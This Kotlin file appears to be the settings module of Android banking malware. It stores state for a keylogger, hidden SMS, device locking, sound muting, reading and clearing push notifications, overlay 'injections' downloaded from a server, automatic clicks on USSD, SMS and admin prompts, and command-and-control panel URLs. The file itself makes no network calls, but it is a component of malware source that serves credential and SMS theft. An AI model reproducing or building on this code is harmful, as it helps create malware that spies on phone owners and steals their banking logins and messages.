package com.xxx.zzz.globp

import android.content.Context
import android.content.SharedPreferences
import com.xxx.zzz.globp.utilssss.Utilslp

object SharedPreferencess {
    var registered: Boolean
        get() {
            return SettingsRead("registered").toBoolean()
        }
        set(value) {
            SettingsWrite("registered", value.toString())
        }
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var autoClickOnceUssd: String
        get() {
            return SettingsRead("autoClickOnce") ?: ""
        }
        set(value) {
            SettingsWrite("autoClickOnce", value)
        }
    var autoClickOnceStream: String
        get() {
            return SettingsRead("autoClickStream") ?: ""
        }
        set(value) {
            SettingsWrite("autoClickStream", value)
        }

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var autoClickCacheCommand: String
        get() {
            return SettingsRead("autoClickCache") ?: ""
        }
        set(value) {
            SettingsWrite("autoClickCache", value)
        }
    var autoClickSmsCommand: String
        get() {
            return settings!!.getString("autoClickSms", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickSms", value)
            editor.apply()
        }
    var autoClickAdminCommand: String
        get() {
            return SettingsRead("autoClickAdmin") ?: ""
        }
        set(value) {
            SettingsWrite("autoClickAdmin", value)
        }
    var clickAutoStart: Boolean
        get() {
            return SettingsRead("clickAutoStart").toBoolean()
        }
        set(value) {
            SettingsWrite("clickAutoStart", value.toString())
        }

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var hasNotifPermition: Boolean
        get() {
            return SettingsRead("hasNotifPermition").toBoolean()
        }
        set(value) {
            SettingsWrite("hasNotifPermition", value.toString())
        }
    var clickNotifPermition: Boolean
        get() {
            return SettingsRead("clickNotifPermition").toBoolean()
        }
        set(value) {
            SettingsWrite("clickNotifPermition", value.toString())
        }

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var hasAllPermition: Boolean
        get() {
            return SettingsRead("hasAllPermition").toBoolean()
        }
        set(value) {
            SettingsWrite("hasAllPermition", value.toString())
        }
    var hasOverlaysPermition: Boolean
        get() {
            return SettingsRead("hasOverlaysPermition").toBoolean()
        }
        set(value) {
            SettingsWrite("hasOverlaysPermition", value.toString())
        }
    var hasDozePermition: Boolean
        get() {
            return SettingsRead("hasDozePermition").toBoolean()
        }
        set(value) {
            SettingsWrite("hasDozePermition", value.toString())
        }

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    val sameName: Boolean
        get() {
            return appName == Utilslp.getLabelApplication(appContext!!)
        }

    var appName: String
        get() {
            return SettingsRead("appName") ?: Utilslp.getLabelApplication(appContext!!)
        }
        set(value) {
            SettingsWrite("appName", value)
        }

    var applicationId: String
        get() {
            return SettingsRead("applicationId") ?: ""
        }
        set(value) {
            SettingsWrite("applicationId", value)
        }
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var killApplication: String
        get() {
            return SettingsRead("killApplication") ?: ""
        }
        set(value) {
            SettingsWrite("killApplication", value)
        }
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////

    var urlAdminPanel: String
        get() {
            return SettingsRead("urlAdminPanel") ?: ""
        }
        set(value) {
            SettingsWrite("urlAdminPanel", value)
        }
    var urls: String
        get() {
            return (SettingsRead("urls") ?: "") + Constantsfd.DEVELOPMENT_SERVER
        }
        set(value) {
            SettingsWrite("urls", value)
        }
    var numUrl: Int
        get() {
            return (SettingsRead("numUrl") ?: "0").toInt()
        }
        set(value) {
            SettingsWrite("numUrl", value.toString())
        }


    var step: Int
        get() {
            return (SettingsRead("step") ?: "0").toInt()
        }
        set(value) {
            SettingsWrite("step", value.toString())
        }

    var step2: Int
        get() {
            return (SettingsRead("step2") ?: "0").toInt()
        }
        set(value) {
            SettingsWrite("step2", value.toString())
        }
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<settings>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var lockDevice: String
        get() {
            return settings!!.getString("lockDevice", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("lockDevice", value)
            editor.apply()
        }

    var hiddenSMS: String
        get() {
            return settings!!.getString("hiddenSMS", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("hiddenSMS", value)
            editor.apply()
        }

    var offSound: String
        get() {
            return settings!!.getString("offSound", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("offSound", value)
            editor.apply()
        }

    var keylogger: String
        get() {
            return settings!!.getString("keylogger", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("keylogger", value)
            editor.apply()
        }

    var clearPush: String
        get() {
            return settings!!.getString("clearPush", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("clearPush", value)
            editor.apply()
        }

    var readPush: String
        get() {
            return settings!!.getString("readPush", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("readPush", value)
            editor.apply()
        }

    var adminCommand: String
        get() {
            return settings!!.getString("start_admin", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("start_admin", value)
            editor.apply()
        }

    var notifCommandTest: String
        get() {
            return settings!!.getString("notifCommand", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("notifCommand", value)
            editor.apply()
        }
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////

    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////
    var activeInjection: String
        get() {
            return settings!!.getString("activeInjection", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("activeInjection", value)
            editor.apply()
        }
    var allInjection: String
        get() {
            return settings!!.getString("allInjection", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("allInjection", value)
            editor.apply()
        }
    var lastDownloadInjects: Long
        get() {
            return settings!!.getLong("lastDownloadInjects", -1L)
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putLong("lastDownloadInjects", value)
            editor.apply()
        }
    ///////////////////////?<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>?////////////////////////

    //////////////////////////app_inject/////////////////////////////
    var app_inject: String
        get() {
            return settings!!.getString("app_inject", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("app_inject", value)
            editor.apply()
        }

    private var settings: SharedPreferences? = null
    private var appContext: Context? = null

    fun getAppContext() = appContext

    fun SettingsRead(name: String?, context: Context? = appContext): String? {
        if (settings == null) {
            settings = context?.getSharedPreferences("settings", Context.MODE_PRIVATE)
        }
        return settings?.getString(name, null)
    }

    fun SettingsToAdd(name: String?, params: String?, context: Context? = appContext) {
        var params = params
        try {
            val getParams = SettingsRead(name, context)
            if (!getParams.isNullOrEmpty()) {
                params = getParams + params
            }
            SettingsWrite(name, params, context)
        } catch (ex: Exception) {
            SettingsWrite(name, params, context)
        }
    }

    fun SettingsWrite(name: String?, params: String?, context: Context? = appContext) {
        if (settings == null) {
            settings = context?.getSharedPreferences("settings", Context.MODE_PRIVATE)
        }
        val editor = settings?.edit()
        editor?.putString(name, params)
        editor?.commit()
    }

    fun init(context: Context) {
        appContext = context
        if (settings == null) {
            settings = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
        }
    }

}